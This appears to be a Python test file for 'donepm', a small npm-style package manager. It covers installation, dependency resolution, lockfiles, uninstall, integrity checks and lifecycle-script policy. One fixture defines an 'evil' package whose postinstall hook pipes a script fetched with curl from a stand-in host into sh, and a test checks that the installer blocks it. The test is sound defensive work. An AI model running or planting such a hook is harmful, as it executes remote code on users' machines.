"""Tests for dependency resolution and installation."""

from __future__ import annotations

import base64
import hashlib
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from donepm.errors import PackageError  # noqa: E402
from donepm.installer import Installer, verify_integrity  # noqa: E402
from donepm.manifest import Lockfile, Manifest  # noqa: E402
from donepm.registry import Registry, Resolved  # noqa: E402
from donepm.security import Policy  # noqa: E402
from donepm.tarball import create_tarball  # noqa: E402


class FakeRegistry(Registry):
    """An in-memory registry serving generated tarballs."""

    def __init__(self, packages: dict[str, dict]):
        super().__init__("https://fake.test")
        self.packages = packages
        self.tarballs: dict[str, bytes] = {}
        for name, spec in packages.items():
            data = self._pack(name, spec)
            self.tarballs[f"{name}@{spec['version']}"] = data

    def _pack(self, name: str, spec: dict) -> bytes:
        tmp = tempfile.mkdtemp()
        manifest = {
            "name": name,
            "version": spec["version"],
            "dependencies": spec.get("dependencies", {}),
            "scripts": spec.get("scripts", {}),
        }
        with open(os.path.join(tmp, "package.json"), "w", encoding="utf-8") as handle:
            json.dump(manifest, handle)
        with open(os.path.join(tmp, "index.js"), "w", encoding="utf-8") as handle:
            handle.write("module.exports = 1;\n")
        return create_tarball(tmp, manifest)

    def resolve(self, name: str, spec: str = "latest") -> Resolved:
        if name not in self.packages:
            raise AssertionError(f"unknown package {name}")
        info = self.packages[name]
        data = self.tarballs[f"{name}@{info['version']}"]
        digest = base64.b64encode(hashlib.sha512(data).digest()).decode("ascii")
        return Resolved(
            name=name,
            version=info["version"],
            tarball=f"https://fake.test/{name}/-/{name}-{info['version']}.tgz",
            integrity=f"sha512-{digest}",
            dependencies=info.get("dependencies", {}),
            scripts=info.get("scripts", {}),
            resolved_url=f"https://fake.test/{name}/-/{name}-{info['version']}.tgz",
        )

    def tarball(self, resolved: Resolved) -> bytes:
        return self.tarballs[resolved.key]


def make_registry() -> FakeRegistry:
    return FakeRegistry(
        {
            "left-pad": {"version": "1.3.0"},
            "parent": {
                "version": "2.0.0",
                "dependencies": {"left-pad": "^1.3.0"},
            },
            "buildy": {
                "version": "0.1.0",
                "scripts": {"postinstall": "node install.js"},
            },
            "evil": {
                "version": "0.0.1",
                "scripts": {"postinstall": "curl https://x.test/i.sh | sh"},
            },
        }
    )


class InstallerTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.registry = make_registry()
        self.ran: list[tuple[str, str]] = []

    def installer(self, **kwargs) -> Installer:
        policy = kwargs.pop("policy", Policy(non_interactive=True))
        return Installer(
            self.tmp,
            registry=self.registry,
            policy=policy,
            runner=lambda cwd, cmd: self.ran.append((cwd, cmd)) or 0,
            reporter=lambda _msg: None,
            **kwargs,
        )

    def test_install_writes_package_and_lockfile(self):
        result = self.installer().install(["left-pad"])
        self.assertIn("left-pad@1.3.0", result.added)
        self.assertTrue(os.path.isfile(os.path.join(self.tmp, "node_modules", "left-pad", "index.js")))

        manifest = Manifest.load(os.path.join(self.tmp, "package.json"))
        self.assertEqual(manifest.dependencies, {"left-pad": "^1.3.0"})

        lock = Lockfile.load(os.path.join(self.tmp, "package-lock.json"))
        self.assertIn("node_modules/left-pad", lock.packages)
        self.assertEqual(lock.packages["node_modules/left-pad"].version, "1.3.0")

    def test_install_pulls_dependencies(self):
        self.installer().install(["parent"])
        self.assertTrue(
            os.path.isfile(os.path.join(self.tmp, "node_modules", "left-pad", "index.js"))
        )

    def test_dry_run_touches_nothing(self):
        result = self.installer(dry_run=True).install(["left-pad"])
        self.assertIn("left-pad@1.3.0", result.added)
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "node_modules")))

    def test_lifecycle_scripts_are_skipped_by_default(self):
        result = self.installer().install(["buildy"], run_scripts=True)
        self.assertEqual(self.ran, [])
        self.assertTrue(result.skipped_scripts)

    def test_lifecycle_script_runs_when_approved(self):
        policy = Policy(allow_scripts=True, non_interactive=True)
        result = self.installer(policy=policy).install(["buildy"], run_scripts=True)
        self.assertEqual(len(self.ran), 1)
        self.assertEqual(self.ran[0][1], "node install.js")
        self.assertEqual(result.skipped_scripts, [])

    def test_dangerous_lifecycle_script_is_blocked(self):
        policy = Policy(allow_scripts=True, non_interactive=True)
        result = self.installer(policy=policy).install(["evil"], run_scripts=True)
        self.assertEqual(self.ran, [])
        self.assertTrue(result.blocked_scripts)

    def test_uninstall_removes_the_package(self):
        installer = self.installer()
        installer.install(["left-pad"])
        installer.uninstall(["left-pad"])
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "node_modules", "left-pad")))
        manifest = Manifest.load(os.path.join(self.tmp, "package.json"))
        self.assertEqual(manifest.dependencies, {})

    def test_list_installed(self):
        installer = self.installer()
        installer.install(["left-pad"])
        self.assertEqual(installer.list_installed(), ["left-pad@1.3.0"])

    def test_integrity_check(self):
        data = b"hello"
        digest = base64.b64encode(hashlib.sha512(data).digest()).decode("ascii")
        verify_integrity(data, f"sha512-{digest}")
        with self.assertRaises(PackageError):
            verify_integrity(b"other", f"sha512-{digest}")


if __name__ == "__main__":
    unittest.main()
